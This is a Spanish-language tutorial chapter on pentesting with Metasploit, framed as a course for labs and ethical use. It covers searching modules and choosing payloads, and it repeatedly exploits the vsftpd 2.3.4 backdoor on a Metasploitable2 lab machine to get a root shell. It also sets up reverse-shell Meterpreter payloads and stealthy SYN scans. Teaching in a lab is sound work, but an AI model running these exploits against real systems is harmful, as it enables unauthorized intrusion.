| **Inicio**         | **atrás 15**                                                  | **Siguiente 17**                         |
| ------------------ | ------------------------------------------------------------- | ---------------------------------------- |
| [🏠](../README.md) | [⏪](./7_15_Escaneo_Activo_y_Analisis_de_Vulnerabilidades.md) | [⏩](./7_17_Hacking_Servicios_de_Red.md) |

---

## **Índice**

| Temario                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------- |
| [939. Introducción a Metasploit Framework](#939-introducción-a-metasploit-framework)                                   |
| [940. Búsqueda de módulos](#940-búsqueda-de-módulos)                                                                   |
| [941. Tipos de payloads](#941-tipos-de-payloads)                                                                       |
| [942. Configuración y ejecución de módulos](#942-configuración-y-ejecución-de-módulos)                                 |
| [943. Gestión de uso de módulos](#943-gestión-de-uso-de-módulos)                                                       |
| [944. Escaneo de puertos con módulos auxiliares](#944-escaneo-de-puertos-con-módulos-auxiliares)                       |
| [945. Importando informes de Nmap](#945-importando-informes-de-nmap)                                                   |
| [946. Escaneo de puertos con db_nmap](#946-escaneo-de-puertos-con-db_nmap)                                             |
| [947. Fingerprinting con módulos auxiliares](#947-fingerprinting-con-módulos-auxiliares)                               |
| [948. Gestión de espacios de trabajo](#948-gestión-de-espacios-de-trabajo)                                             |
| [949. Importando informes de escáneres de vulnerabilidades](#949-importando-informes-de-escáneres-de-vulnerabilidades) |
| [950. Comando connect](#950-comando-connect)                                                                           |
| [951. Plugins de Metasploit](#951-plugins-de-metasploit)                                                               |
| [952. Análisis de vulnerabilidades con WMAP](#952-análisis-de-vulnerabilidades-con-wmap)                               |
| [953. Análisis de vulnerabilidades con Nessus](#953-análisis-de-vulnerabilidades-con-nessus)                           |
| [954. Connection Handler](#954-connection-handler)                                                                     |
| [955. Instalación de maquina de pruebas Metasploitable](#955-instalación-de-maquina-de-pruebas-metasploitable)         |
| [956. Explotación de servicio FTP](#956-explotación-de-servicio-ftp)                                                   |
| [957. Extraer y descifrar contraseñas](#957-extraer-y-descifrar-contraseñas)                                           |
| [958. Netcat a Metasploit Shell](#958-netcat-a-metasploit-shell)                                                       |

# **Hacking: Pentesting con Metasploit**

## **939. Introducción a Metasploit Framework**

### ✅ ¿Qué es Metasploit Framework?

**Metasploit Framework** es una de las herramientas más potentes y populares del mundo del **hacking ético** y **pentesting**. Se utiliza principalmente para:

- Buscar y explotar vulnerabilidades
- Crear exploits personalizados
- Realizar pruebas de penetración automatizadas
- Mantener acceso a sistemas comprometidos (post-explotación)
- Generar payloads (código malicioso controlado)

> ⚠️ **Metasploit** se usa en entornos controlados y con fines educativos, legales y éticos. No lo uses contra sistemas que no tienes permiso para auditar.

---

### 📚 ¿Para qué sirve?

| Función                | Explicación simple                                                               |
| ---------------------- | -------------------------------------------------------------------------------- |
| **Explotación**        | Atacar sistemas con vulnerabilidades conocidas                                   |
| **Payloads**           | Código que se ejecuta en el sistema víctima (como reverse shell)                 |
| **Escaneo y análisis** | Buscar servicios y vulnerabilidades en la red                                    |
| **Post-explotación**   | Una vez adentro, realizar más acciones: leer archivos, escalar privilegios, etc. |

---

### 🛠️ ¿Cómo instalar Metasploit Framework?

#### ✅ Opción 1: Viene preinstalado en **Kali Linux**

Si usas Kali, simplemente abre la terminal y ejecuta:

```bash
msfconsole
```

---

#### ✅ Opción 2: Instalar en Ubuntu/Debian manualmente

1. **Actualizar paquetes:**

```bash
sudo apt update && sudo apt upgrade -y
```

2. **Instalar dependencias:**

```bash
sudo apt install curl gnupg2 -y
```

3. **Descargar e instalar Metasploit:**

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

4. **Abrir Metasploit:**

```bash
msfconsole
```

---

#### ✅ Opción 3: En Windows (con WSL)

Instalarlo directamente en Windows es más complejo. Lo más recomendable es usar:

- **WSL con Kali Linux**
- **Máquina virtual con Kali**
- **Instalar desde Metasploit Installer de Rapid7** (menos usado hoy)

---

### 🔎 Comandos básicos de Metasploit

| Comando           | Qué hace                                  |
| ----------------- | ----------------------------------------- |
| `msfconsole`      | Inicia la consola de Metasploit           |
| `search`          | Buscar exploits, payloads, módulos        |
| `use`             | Cargar un módulo para usarlo              |
| `info`            | Información detallada sobre un módulo     |
| `set`             | Establece parámetros como RHOST o PAYLOAD |
| `run` o `exploit` | Ejecuta el ataque                         |
| `sessions`        | Ver sesiones activas con víctimas         |

---

### 💣 Ejemplo completo: Ataque con Metasploit a una máquina vulnerable

#### 🎯 Objetivo: Conectarnos a una máquina vulnerable **Metasploitable2** usando un exploit

#### 🧪 Paso 1: Escaneo con Nmap

Desde Kali:

```bash
nmap -sV 192.168.1.105
```

Ejemplo de resultado:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
```

> 🎯 El puerto 21 está abierto y tiene una versión de `vsftpd` vulnerable.

---

#### 🧪 Paso 2: Iniciar Metasploit

```bash
msfconsole
```

---

#### 🧪 Paso 3: Buscar el exploit

```bash
search vsftpd 2.3.4
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### 🧪 Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### 🧪 Paso 5: Configurar el objetivo

```bash
set RHOST 192.168.1.105
```

> Si necesitas configurar el puerto:

```bash
set RPORT 21
```

---

#### 🧪 Paso 6: Ejecutar el exploit

```bash
exploit
```

Resultado:

```
[*] Command shell session 1 opened
```

¡Éxito! Tienes una **shell del sistema víctima** 🎉

---

#### 🧪 Paso 7: Interactuar con la sesión

```bash
sessions
sessions -i 1
```

Ahora puedes ejecutar comandos como:

```bash
whoami
uname -a
ls
```

---

### 🧩 Conclusión

| Elemento                   | Valor                                                      |
| -------------------------- | ---------------------------------------------------------- |
| 🛠️ Herramienta             | Metasploit Framework                                       |
| 📌 Función principal       | Explotar vulnerabilidades en sistemas y web apps           |
| 🧪 Ideal para              | Pentesting, CTFs, laboratorios de seguridad, bug bounty    |
| ✅ Instalación recomendada | Kali Linux (ya viene incluido)                             |
| 🔐 Uso ético               | Solo en laboratorios o entornos donde tengas permiso legal |

---

[🔼](#índice)

---

## **940. Búsqueda de módulos**

### 🔍 ¿Qué es la **búsqueda de módulos** en Metasploit?

En Metasploit, los **módulos** son piezas de código listas para usarse que te ayudan a:

| Tipo de módulo | ¿Qué hace?                                                                      |
| -------------- | ------------------------------------------------------------------------------- |
| `exploit`      | Atacar una vulnerabilidad específica.                                           |
| `auxiliary`    | Escanear, recolectar info, analizar servicios, etc.                             |
| `payload`      | Código que se ejecuta en la víctima después del exploit (como abrir una shell). |
| `post`         | Tareas después de explotar (como robar contraseñas o escalar privilegios).      |
| `encoder`      | Codificar un payload para evadir detección.                                     |
| `nop`          | Relleno (no hace nada, pero sirve en exploits buffer overflow).                 |

---

### 🛠️ ¿Cómo buscar módulos en Metasploit?

Una vez estás en la consola de Metasploit (`msfconsole`), usas el comando:

```bash
search <palabra_clave>
```

---

### ✅ Ejemplos básicos de búsqueda:

#### 1. Buscar por nombre del servicio:

```bash
search vsftpd
```

Resultado esperado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### 2. Buscar por tipo de vulnerabilidad:

```bash
search type:exploit name:samba
```

Resultado:

```
exploit/linux/samba/trans2open
```

---

#### 3. Buscar módulos auxiliares:

```bash
search type:auxiliary name:scanner
```

Esto listará **scanners** para SMB, FTP, HTTP, SNMP, etc.

---

#### 4. Buscar por CVE:

```bash
search cve:2017-0144
```

Resultado:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

#### 5. Filtro por plataforma (por ejemplo, Windows):

```bash
search platform:windows type:exploit
```

---

### 🧠 ¿Cómo sé qué módulo usar?

Después de buscar uno, puedes usar el comando:

```bash
info <nombre_del_módulo>
```

Ejemplo:

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

Te dirá:

- Qué hace
- Qué necesita (RHOST, RPORT, payloads, etc.)
- Qué sistemas vulnerables ataca

---

### ✅ Instalación de Metasploit (por si no lo tienes)

Ya viene instalado en **Kali Linux**, pero si lo necesitas instalar en otra distro:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### 🧪 Ejemplo completo: Búsqueda de exploit para vsftpd 2.3.4

#### Paso 1: Inicia Metasploit

```bash
msfconsole
```

---

#### Paso 2: Busca el módulo

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 3: Verifica detalles del módulo

```bash
info exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el módulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Establece parámetros necesarios

```bash
set RHOST 192.168.1.105
```

> Asegúrate de que el objetivo es vulnerable (por ejemplo, usando Metasploitable2).

---

#### Paso 6: Ejecuta el exploit

```bash
exploit
```

¡Y listo! Si todo salió bien, tendrás acceso a la víctima.

---

### ✅ Resumen práctico

| Acción                  | Comando Ejemplo                             |
| ----------------------- | ------------------------------------------- |
| Buscar cualquier módulo | `search smb`                                |
| Buscar por tipo         | `search type:exploit`                       |
| Buscar por CVE          | `search cve:2017-0144`                      |
| Buscar por plataforma   | `search platform:linux`                     |
| Ver info de módulo      | `info exploit/unix/ftp/vsftpd_234_backdoor` |
| Usar módulo             | `use exploit/unix/ftp/vsftpd_234_backdoor`  |

---

[🔼](#índice)

---

## **941. Tipos de payloads**

### 🧠 ¿Qué es un payload?

En el contexto del **hacking ético**, un **payload** es el **código que se ejecuta en la máquina víctima** después de haber explotado una vulnerabilidad. Es el "cargamento" malicioso que el atacante envía.

#### 🧩 Ejemplo real:

Si usas un exploit para aprovechar una vulnerabilidad en un servidor FTP, el **exploit** abre la puerta y el **payload** es lo que metes por esa puerta, por ejemplo: una terminal remota (shell).

---

### 🧷 Tipos principales de payloads en Metasploit

Metasploit agrupa los payloads en 3 grandes tipos:

| Tipo        | ¿Qué hace?                                                                  |
| ----------- | --------------------------------------------------------------------------- |
| **Singles** | Un solo archivo. Ejecuta una acción específica.                             |
| **Stagers** | Carga una parte del payload primero y luego descarga el resto.              |
| **Stages**  | Segunda parte de un stager. Contiene el código completo (como meterpreter). |

> 💡 En general, Metasploit combina **stager + stage** en un **payload completo**.

---

### 🔥 Clasificación de payloads según lo que hacen

#### 1. **Bind Shell**

- La víctima abre un puerto y el atacante se conecta.
- No pasa por firewalls si están cerrados.
- Necesita que el puerto en la víctima esté abierto.

**Ejemplo:**

```
payload/linux/x86/shell_bind_tcp
```

---

#### 2. **Reverse Shell**

- La víctima se conecta al atacante.
- Ideal para saltarse firewalls.
- El atacante debe estar escuchando (con `LHOST` y `LPORT`).

**Ejemplo:**

```
payload/windows/meterpreter/reverse_tcp
```

---

#### 3. **Meterpreter**

- Shell avanzada. Control total.
- Funciona sobre reverse o bind shell.
- Permite:

  - Captura de pantalla
  - Escalar privilegios
  - Leer archivos
  - Keylogger
  - Crear persistencia

**Ejemplo:**

```
windows/meterpreter/reverse_tcp
```

---

#### 4. **Command Payloads**

- Ejecutan comandos simples en la víctima.
- Son muy pequeños, pero limitados.

**Ejemplo:**

```
cmd/unix/reverse
```

---

### ⚙️ ¿Cómo buscar payloads?

Desde Metasploit:

```bash
show payloads
```

O para ver payloads compatibles con un exploit:

```bash
show payloads
```

(luego de hacer `use exploit/...`)

---

### 🔽 ¿Cómo instalar Metasploit?

Ya lo vimos antes, pero lo resumo:

#### En Kali Linux:

```bash
msfconsole
```

#### En Debian/Ubuntu:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### 🧪 EJEMPLO COMPLETO PASO A PASO

#### 🎯 Objetivo:

Hacer que la máquina víctima (Metasploitable2) se conecte a nuestra Kali usando un **payload reverse shell Meterpreter**.

---

#### Paso 1: Escanear con Nmap

```bash
nmap -sV 192.168.1.105
```

Resultado:

```
21/tcp open  vsftpd 2.3.4
```

---

#### Paso 2: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 3: Buscar el exploit

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Ver los payloads compatibles

```bash
show payloads
```

Verás cosas como:

```
cmd/unix/interact
```

---

#### Paso 6: Seleccionar un payload

```bash
set payload cmd/unix/interact
```

O si fuera Windows con Meterpreter:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

#### Paso 7: Configurar dirección de escucha

```bash
set RHOST 192.168.1.105
set LHOST 192.168.1.100  # tu IP
```

---

#### Paso 8: Ejecutar el exploit

```bash
exploit
```

---

#### Paso 9: ¡Acceso!

Si todo fue bien, tendrás acceso a una shell interactiva. Si usaste Meterpreter:

```bash
sessions
sessions -i 1
```

Y ya puedes usar comandos como:

```bash
sysinfo
getuid
ls
```

---

### 📌 RESUMEN FINAL

| Concepto             | Ejemplo                                               |
| -------------------- | ----------------------------------------------------- |
| Payload              | Código que se ejecuta después de explotar un objetivo |
| Tipos                | Reverse shell, Bind shell, Meterpreter, CMD           |
| Combinaciones        | Stager + Stage = Payload completo                     |
| Buscar en Metasploit | `show payloads`                                       |
| Usar un payload      | `set payload <nombre>`                                |

---

[🔼](#índice)

---

## **942. Configuración y ejecución de módulos**

### 🔍 ¿Qué es un módulo en Metasploit?

Un **módulo** en Metasploit es **una unidad de funcionalidad reutilizable**. Es como una pieza de código preparada para realizar una tarea específica en el ciclo de pentesting.

> En resumen: ¡son herramientas dentro de Metasploit!

---

### 🧩 Tipos de módulos

| Tipo de módulo | ¿Qué hace?                                                    |
| -------------- | ------------------------------------------------------------- |
| `exploit`      | Aprovecha una vulnerabilidad para acceder a un sistema        |
| `payload`      | Código que se ejecuta una vez que se ha explotado algo        |
| `auxiliary`    | Módulos de apoyo (escaneo, fuerza bruta, sniffers, etc.)      |
| `post`         | Acciones luego de obtener acceso (pivoting, keyloggers, etc.) |
| `encoder`      | Ofusca el payload para evadir antivirus                       |
| `nop`          | Instrucciones de relleno para evitar detección                |

---

### 🔧 ¿Cómo se instala Metasploit?

#### En Kali Linux:

Ya viene instalado. Solo abre:

```bash
msfconsole
```

#### En Ubuntu/Debian:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### ⚙️ ¿Cómo configurar y ejecutar un módulo?

Te explico con pasos claros 👇

---

#### Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### Paso 2: Buscar un módulo

Por ejemplo, si queremos buscar un exploit para FTP:

```bash
search ftp
```

También puedes filtrar:

```bash
search type:exploit name:vsftpd
```

---

#### Paso 3: Usar un módulo

Cuando encuentres el que necesitas, lo seleccionas con:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Ver opciones requeridas

```bash
show options
```

Verás cosas como:

```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
RHOST                       yes       IP de la víctima
RPORT     21                yes       Puerto FTP
```

---

#### Paso 5: Configurar variables necesarias

```bash
set RHOST 192.168.1.105
set RPORT 21
set LHOST 192.168.1.100
```

Si vas a usar un payload:

```bash
set payload cmd/unix/interact
```

---

#### Paso 6: Ejecutar el módulo

```bash
run
```

o:

```bash
exploit
```

---

### ✅ EJEMPLO COMPLETO REAL

#### 🎯 Objetivo: Explotar vsftpd 2.3.4 en una máquina vulnerable (como Metasploitable2)

---

#### Paso 1: Abrimos Metasploit

```bash
msfconsole
```

---

#### Paso 2: Buscar módulo de exploit para vsftpd

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 3: Usamos el módulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Ver opciones

```bash
show options
```

---

#### Paso 5: Configuramos IP de la víctima

```bash
set RHOST 192.168.1.105
```

Este exploit ya trae un payload por defecto (cmd/unix/interact), así que no necesitas configurar payload.

---

#### Paso 6: Ejecutamos el módulo

```bash
run
```

---

#### Resultado:

Si todo va bien, te aparecerá una shell interactiva:

```
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

¡Acceso conseguido! 🚩

---

### 🧠 RESUMEN FINAL

| Paso | Acción                                  |
| ---- | --------------------------------------- |
| 1    | `search <palabra clave>`                |
| 2    | `use <nombre del módulo>`               |
| 3    | `show options`                          |
| 4    | `set RHOST`, `set LHOST`, `set payload` |
| 5    | `run` o `exploit`                       |
| 6    | Interactuar con la sesión (`sessions`)  |

---

[🔼](#índice)

---

## **943. Gestión de uso de módulos**

### 🧩 ¿Qué es la gestión de módulos en Metasploit?

La **gestión de módulos** consiste en:

- 📌 Buscar módulos según tus necesidades (exploits, escaneos, post-explotación…).
- ⚙️ Configurar correctamente sus parámetros.
- 🎯 Ejecutarlos y controlar el resultado.
- 🔄 Gestionar sesiones activas si se logra una intrusión.

---

### 📚 Tipos de módulos en Metasploit

| Tipo        | Función                                                                  |
| ----------- | ------------------------------------------------------------------------ |
| `exploit`   | Ejecuta vulnerabilidades para acceder a un sistema                       |
| `auxiliary` | Herramientas de apoyo (escaneo, sniffers, fuerza bruta, etc.)            |
| `post`      | Acciones después del acceso (dump de contraseñas, persistencia, etc.)    |
| `payload`   | Código que se ejecuta tras el exploit (reverse shell, meterpreter, etc.) |
| `encoder`   | Ofuscar payloads para evitar detección                                   |
| `nop`       | Instrucciones vacías para relleno                                        |

---

### 🛠️ ¿Cómo instalar Metasploit?

#### En Kali Linux:

Ya viene instalado.

```bash
msfconsole
```

#### En Ubuntu (manual):

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### 🔎 Gestión de módulos paso a paso

#### ✅ Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### ✅ Paso 2: Buscar un módulo

Ejemplo: quieres atacar un servidor FTP

```bash
search type:exploit name:ftp
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### ✅ Paso 3: Usar el módulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Verás que el prompt cambia a:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

#### ✅ Paso 4: Ver opciones del módulo

```bash
show options
```

Esto muestra las variables necesarias como:

- RHOST → IP de la víctima
- RPORT → Puerto objetivo
- PAYLOAD → (si aplica)

---

#### ✅ Paso 5: Configurar las opciones necesarias

```bash
set RHOST 192.168.1.105
set RPORT 21
```

Si deseas cambiar el payload:

```bash
set payload cmd/unix/reverse
set LHOST 192.168.1.106
set LPORT 4444
```

---

#### ✅ Paso 6: Ejecutar el módulo

```bash
exploit
```

o

```bash
run
```

---

### 🧠 Gestión adicional: sesiones

Si obtuviste acceso, puedes tener una sesión activa.

#### Ver sesiones:

```bash
sessions
```

#### Interactuar con una sesión específica:

```bash
sessions -i 1
```

#### Salir de la sesión sin cerrarla:

```bash
background
```

---

### ✅ EJEMPLO COMPLETO

#### Escenario: Atacar un servidor FTP vulnerable (Metasploitable2)

---

#### 🔹 Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### 🔹 Paso 2: Buscar exploit

```bash
search vsftpd
```

---

#### 🔹 Paso 3: Usar exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### 🔹 Paso 4: Ver opciones

```bash
show options
```

---

#### 🔹 Paso 5: Configurar IP de víctima

```bash
set RHOST 192.168.1.105
```

No se requiere payload, ya que este exploit abre una shell.

---

#### 🔹 Paso 6: Ejecutar

```bash
run
```

---

#### Resultado:

```
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

Ahora puedes hacer:

```bash
sessions
sessions -i 1
```

Y ya tienes acceso root 😎

---

### 🧠 CONSEJOS ÚTILES

| Comando            | Función                            |
| ------------------ | ---------------------------------- |
| `search`           | Buscar módulos                     |
| `use`              | Usar un módulo                     |
| `set`              | Asignar valor a opciones           |
| `unset`            | Eliminar una opción                |
| `show options`     | Mostrar variables del módulo       |
| `info`             | Información detallada del módulo   |
| `exploit` / `run`  | Ejecutar el módulo                 |
| `sessions`         | Ver sesiones activas               |
| `sessions -i <id>` | Entrar a sesión activa             |
| `background`       | Regresar al menú sin cerrar sesión |

---

[🔼](#índice)

---

## **944. Escaneo de puertos con módulos auxiliares**

### 🧠 ¿Qué es el escaneo de puertos con módulos auxiliares?

El escaneo de puertos consiste en identificar **puertos abiertos** en un sistema remoto. Esto es importante porque:

- Cada puerto abierto puede indicar un **servicio** corriendo (como SSH, FTP, HTTP, etc.).
- Identificar los servicios permite planear **exploits** o ataques dirigidos.

Metasploit tiene **módulos auxiliares** (`auxiliary/scanner`) que permiten realizar **escaneos de puertos y servicios** sin explotar directamente una vulnerabilidad.

---

### 🛠️ Instalación de Metasploit

Si estás en **Kali Linux**, ya viene instalado:

```bash
msfconsole
```

Si usas **Ubuntu**, puedes instalarlo así:

```bash
sudo apt update
sudo apt install curl -y
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole
```

---

### 🔍 Módulos auxiliares de escaneo

Algunos módulos útiles para escaneo de puertos:

| Módulo auxiliar         | Función                             |
| ----------------------- | ----------------------------------- |
| `scanner/portscan/tcp`  | Escaneo TCP simple                  |
| `scanner/portscan/syn`  | Escaneo SYN (rápido y más sigiloso) |
| `scanner/portscan/ack`  | Determinar reglas de firewall       |
| `scanner/portscan/xmas` | Escaneo tipo Xmas para firewalls    |

---

### ⚙️ Comandos básicos

| Comando                | Función                        |
| ---------------------- | ------------------------------ |
| `search portscan`      | Buscar módulos de escaneo      |
| `use <módulo>`         | Seleccionar un módulo          |
| `show options`         | Ver las opciones configurables |
| `set <opción> <valor>` | Configurar variables           |
| `run` o `exploit`      | Ejecutar el módulo             |

---

### ✅ EJEMPLO COMPLETO: Escaneo de puertos TCP

#### 🧪 Objetivo:

Escanear los puertos abiertos de una máquina con IP `192.168.1.105` usando el módulo auxiliar de TCP.

---

#### 🔹 Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### 🔹 Paso 2: Buscar el módulo

```bash
search portscan
```

Busca esto:

```
auxiliary/scanner/portscan/tcp
```

---

#### 🔹 Paso 3: Usar el módulo

```bash
use auxiliary/scanner/portscan/tcp
```

---

#### 🔹 Paso 4: Ver las opciones

```bash
show options
```

Verás algo como:

```
RHOSTS        => (IP o rango objetivo)
PORTS         => (puertos a escanear)
THREADS       => (cantidad de hilos para escaneo concurrente)
```

---

#### 🔹 Paso 5: Configurar los parámetros

```bash
set RHOSTS 192.168.1.105
set PORTS 21-1000
set THREADS 20
```

Esto escaneará los puertos del 21 al 1000 en la IP objetivo con 20 hilos simultáneos.

---

#### 🔹 Paso 6: Ejecutar el escaneo

```bash
run
```

Resultado típico:

```
[*] 192.168.1.105:21 - TCP OPEN
[*] 192.168.1.105:22 - TCP OPEN
[*] 192.168.1.105:80 - TCP OPEN
[*] 192.168.1.105:111 - TCP OPEN
```

¡Listo! Ahora sabes qué servicios están expuestos y puedes usar exploits específicos.

---

### ✅ Comparación con Nmap

Nmap también hace escaneos, pero Metasploit te permite **integrar directamente con exploits**, además de automatizar tareas posteriores.

Por ejemplo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.105
run
```

---

### 🧠 Consejos útiles

- Puedes escanear rangos completos: `set RHOSTS 192.168.1.0/24`
- Puedes usar varios módulos: también hay auxiliares para **servicios específicos** (como `scanner/ssh/ssh_version`)
- Para evitar ser detectado por IDS/IPS, usa `scanner/portscan/syn` (tipo stealth)

---

[🔼](#índice)

---

## **945. Importando informes de Nmap**

### 🧠 ¿Qué significa importar informes de Nmap?

Cuando haces un escaneo con **Nmap**, puedes guardar los resultados en un **archivo XML**.

Luego, puedes **importar ese archivo en Metasploit** para:

- Aprovechar la información de hosts, puertos y servicios escaneados.
- Usar esa información para lanzar exploits de forma más rápida.
- Organizar mejor tus sesiones de ataque o análisis de red.

---

### 🛠️ Paso 1: Hacer un escaneo con Nmap y guardar como XML

Abre tu terminal (en Kali Linux o cualquier distro que tenga Nmap) y ejecuta:

```bash
nmap -sS -p 21,22,80,443 -oX escaneo.xml 192.168.1.105
```

#### ¿Qué hace esto?

- `-sS`: Escaneo TCP SYN (modo sigiloso).
- `-p`: Puertos que quieres escanear.
- `-oX escaneo.xml`: Exporta los resultados en formato XML (necesario para importar en Metasploit).
- `192.168.1.105`: IP objetivo.

Esto creará un archivo llamado `escaneo.xml` con toda la información del escaneo.

---

### 🛠️ Paso 2: Abrir Metasploit

En la terminal escribe:

```bash
msfconsole
```

---

### 🛠️ Paso 3: Verificar que estás en una base de datos de Metasploit

Primero, asegúrate de que la **base de datos está conectada**. Usa:

```bash
db_status
```

Si ves:

```
[*] Connected to msf...
```

Todo está bien.

Si no está conectada, puedes iniciar PostgreSQL (en Kali) así:

```bash
sudo systemctl start postgresql
```

---

### 🛠️ Paso 4: Importar el archivo XML

Ahora importa el archivo `.xml` que generaste con Nmap:

```bash
db_import /ruta/al/archivo/escaneo.xml
```

Ejemplo:

```bash
db_import /home/kali/escaneo.xml
```

---

### ✅ ¿Qué pasa al importar?

Metasploit:

- Añade los **hosts detectados** a su base de datos interna.
- Reconoce los **puertos abiertos** y servicios.
- Puedes consultarlos con comandos como:

```bash
hosts
services
```

Resultado típico:

```
Hosts
======
address         mac    name    os_name
192.168.1.105          target  Linux

Services
========
host            port  proto  name  state
192.168.1.105   22    tcp    ssh   open
192.168.1.105   80    tcp    http  open
```

---

### 🧪 EJEMPLO COMPLETO

#### 🔹 Paso 1: Escaneo con Nmap

```bash
nmap -sS -p 21-1000 -oX resultado.xml 192.168.1.105
```

#### 🔹 Paso 2: Abrir Metasploit

```bash
msfconsole
```

#### 🔹 Paso 3: Confirmar base de datos

```bash
db_status
```

#### 🔹 Paso 4: Importar resultado

```bash
db_import /home/kali/resultado.xml
```

#### 🔹 Paso 5: Ver hosts y servicios

```bash
hosts
services
```

---

### 🚀 ¿Para qué sirve esto?

1. Ahorras tiempo: no necesitas volver a escanear en Metasploit.
2. Usas escaneos avanzados de Nmap (con scripts o parámetros complejos) y los analizas en Metasploit.
3. Puedes lanzar exploits desde Metasploit directamente sobre los servicios detectados.

---

### 🧠 Tips extra

- También puedes usar archivos `.gnmap` o `.nmap` en algunos casos, pero **el XML es el más compatible** con Metasploit.
- Puedes usar Zenmap (interfaz gráfica de Nmap) para escanear y exportar a XML.

---

[🔼](#índice)

---

## **946. Escaneo de puertos con db_nmap**

### 🧠 ¿Qué es `db_nmap`?

`db_nmap` es una **versión integrada de Nmap dentro de Metasploit**. Permite realizar escaneos de red **y guardar automáticamente los resultados en la base de datos de Metasploit** (MSF).

🔍 En resumen:

- Usa Nmap por debajo.
- Pero guarda resultados directo en Metasploit (hosts, puertos, servicios).
- Es útil para análisis más rápido y automatizado dentro del flujo de pentesting.

---

### 🛠️ ¿Cómo se instala `db_nmap`?

No necesitas instalar `db_nmap` por separado, **viene incluido con Metasploit**.

Lo único que necesitas es:

1. Tener Metasploit Framework instalado.
2. Tener Nmap instalado.
3. Tener la base de datos de Metasploit activa.

#### ✅ Verifica:

- **Instalar Nmap (si no está):**

```bash
sudo apt install nmap
```

- **Iniciar PostgreSQL y Metasploit:**

```bash
sudo systemctl start postgresql
msfconsole
```

- **Verificar que la base de datos esté conectada:**

```bash
db_status
```

Debe decir:

```
[*] Connected to msf...
```

---

### 📦 ¿Cómo se usa `db_nmap`?

Una vez dentro de `msfconsole`, puedes usarlo igual que Nmap. Ejemplo básico:

```bash
db_nmap -sS -p 22,80 192.168.1.105
```

#### ¿Qué hace esto?

- `-sS`: Escaneo SYN (modo sigiloso).
- `-p 22,80`: Escanea puertos 22 (SSH) y 80 (HTTP).
- `192.168.1.105`: IP objetivo.

---

### 🧪 Ejemplo completo y detallado

#### 🔹 Paso 1: Abrir Metasploit

```bash
msfconsole
```

#### 🔹 Paso 2: Verificar la base de datos

```bash
db_status
```

#### 🔹 Paso 3: Usar `db_nmap`

```bash
db_nmap -sS -p 21-1000 192.168.1.105
```

Resultado esperado:

```
[*] Nmap: Starting Nmap...
[*] Nmap: Nmap scan report for 192.168.1.105
[*] Nmap: Host is up (0.0010s latency).
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 80/tcp   open  http
```

Metasploit guarda esto automáticamente en su base de datos.

#### 🔹 Paso 4: Ver los resultados

- **Ver hosts:**

```bash
hosts
```

- **Ver servicios:**

```bash
services
```

---

### ✅ Ventajas de usar `db_nmap` vs `nmap`

| Característica              | `nmap` normal | `db_nmap` (Metasploit)      |
| --------------------------- | ------------- | --------------------------- |
| Escaneo                     | ✅ Sí         | ✅ Sí                       |
| Guarda en base de datos MSF | ❌ No         | ✅ Sí                       |
| Integración con exploits    | ❌ Manual     | ✅ Automática               |
| Consultas dentro de MSF     | ❌ No         | ✅ Sí (`hosts`, `services`) |

---

### 🔧 Tipos comunes de escaneo con `db_nmap`

- **Escaneo TCP SYN (sigiloso):**

```bash
db_nmap -sS 192.168.1.105
```

- **Escaneo de puertos específicos:**

```bash
db_nmap -p 21,22,80,443 192.168.1.105
```

- **Escaneo con detección de versión:**

```bash
db_nmap -sV 192.168.1.105
```

- **Escaneo completo (agresivo):**

```bash
db_nmap -A 192.168.1.105
```

---

### 🧠 Tip Final

Después de escanear con `db_nmap`, puedes buscar módulos de explotación según los servicios encontrados, por ejemplo:

```bash
